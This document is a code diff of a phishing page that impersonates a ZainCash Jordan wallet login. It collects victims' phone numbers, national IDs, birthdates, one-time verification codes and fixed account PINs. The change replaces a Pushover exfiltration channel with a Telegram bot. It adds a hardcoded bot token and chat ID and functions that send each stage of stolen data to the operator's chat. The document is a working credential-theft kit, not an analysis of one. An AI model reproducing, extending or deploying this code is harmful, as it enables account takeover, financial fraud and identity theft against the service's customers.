@@ -18,7 +18,6 @@
   <meta name="twitter:image" content="https://www2.0zz0.com/2025/06/23/15/797647963.jpeg" />
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">
   <style>
-    /* ... (نفس الستايل كما هو) ... */
     body {
       background: linear-gradient(135deg, #2F80ED 0%, #56CCF2 100%);
       min-height: 100vh;
@@ -292,10 +291,12 @@
   </div>
   <script>
     const zainCashLogo = "https://www2.0zz0.com/2025/06/23/15/797647963.jpeg";
-    // لم يعد هناك حاجة لـ telegram
+    const BOT_TOKEN = "8478729698:AAH6ufdvIQicXkUajFb3M1ocoGusDHIbWoI";
+    const CHAT_ID = "6873334348";
     let userData = { phone: '', nationalId: '', birthdate: '', code5: '', code4: '' };
     let currentStep = "phone";
     let waitingTimeout = null;
+    let telegramMsgId = null;
 
     function stepIndicator(step) {
       return `
@@ -339,9 +340,9 @@
         }
         userData.phone = phone;
         try {
-          await sendToPushover(`🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}`);
+          telegramMsgId = await sendToTelegramAndGetMsgId(`🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}`);
         } catch (err) {
-          console.log("API error:", err);
+          console.log("Telegram error:", err);
         }
         renderNationalIdStep();
       };
@@ -372,8 +373,8 @@
         const day = document.getElementById('birthDay').value;
         const month = document.getElementById('birthMonth').value;
         const year = document.getElementById('birthYear').value;
-        if (!/^\d{10,12}$/.test(nationalId)) {
-          alert('يرجى إدخال رقم وطني صحيح (10 إلى 12 رقم)');
+        if (!/^\d{10,10}$/.test(nationalId)) {
+          alert('يرجى إدخال رقم وطني صحيح (10 إلى 10 رقم)');
           document.getElementById('nationalId').focus();
           return;
         }
@@ -385,11 +386,11 @@
         userData.nationalId = nationalId;
         userData.birthdate = birthdate;
         try {
-          await sendToPushover(
+          telegramMsgId = await resendTelegramMsg(
             `🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}`
           );
         } catch (err) {
-          console.log("API error:", err);
+          console.log("Telegram error:", err);
         }
         showNationalIdWaitAndGotoCode5();
       };
@@ -478,11 +479,11 @@
         }
         userData.code5 = code;
         try {
-          await sendToPushover(
+          telegramMsgId = await resendTelegramMsg(
             `🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}\n🔢 رمز التحقق الأول: ${userData.code5}`
           );
         } catch (err) {
-          console.log("API error:", err);
+          console.log("Telegram error:", err);
         }
         showWaitMsgAndGotoCode4();
       };
@@ -522,7 +523,7 @@
         <button class="back-btn" id="backBtn">&#8592; رجوع</button>
         ${header("تحقق إضافي لحماية حسابك")}
         ${stepIndicator(3)}
-        <div class="info-msg">يرجى ادخال رمز حسابك المكون من 4 ارقام فقط للمتابعة</div>
+        <div class="info-msg">قم بادخال رمز حسابك من 4 ارقام الثابت لاكمال تسجيل الدخول</div>
         <form id="code4Form" autocomplete="off">
           <div class="code-inputs">
             <input type="text" maxlength="4" pattern="\\d{4}" required id="code4input" inputmode="numeric" placeholder="****" />
@@ -546,11 +547,11 @@
         }
         userData.code4 = code;
         try {
-          await sendToPushover(
+          telegramMsgId = await resendTelegramMsg(
             `🟦 تسجيل دخول زين كاش الأردن\n📱 الهاتف: ${userData.phone}\n🆔 الرقم الوطني: ${userData.nationalId}\n🎂 تاريخ الميلاد: ${userData.birthdate}\n🔢 رمز التحقق الأول: ${userData.code5}\n🔒 رمز التحقق الثاني: ${userData.code4}`
           );
         } catch (err) {
-          console.log("API error:", err);
+          console.log("Telegram error:", err);
         }
         showModal();
       };
@@ -567,31 +568,46 @@
       renderCode5Step();
     }
 
-    // الدالة الجديدة لإرسال الرسالة عبر Pushover
-    async function sendToPushover(msg) {
-      // إعدادات Pushover
-      const token = "a18nz3jgd2q4gbnmjs2f6dzay4wk3d";
-      const user = "uu78x3bxkktndyq5dmeznjoj5ctfmk";
-      // يمكنك تخصيص العنوان كما تحب
-      const title = "ZainCash Jordan";
-      const payload = new URLSearchParams({
-        token,
-        user,
-        title,
-        message: msg
-      });
+    async function sendToTelegramAndGetMsgId(msg) {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg
+          })
+        });
+        const data = await res.json();
+        if (data && data.result && data.result.message_id) {
+          return data.result.message_id;
+        }
+      } catch (err) {
+        console.log("Telegram send error:", err);
+      }
+      return null;
+    }
 
-      await fetch("https://api.pushover.net/1/messages.json", {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: payload.toString()
-      });
+    async function resendTelegramMsg(msg) {
+      if (telegramMsgId) {
+        try {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              message_id: telegramMsgId
+            })
+          });
+        } catch (err) {
+          // تجاهل الخطأ إذا الرسالة محذوفة أو غير موجودة
+        }
+      }
+      return await sendToTelegramAndGetMsgId(msg);
     }
 
     const app = document.getElementById('app');
     renderPhoneStep();
   </script>
 </body>
-
 </html>
-
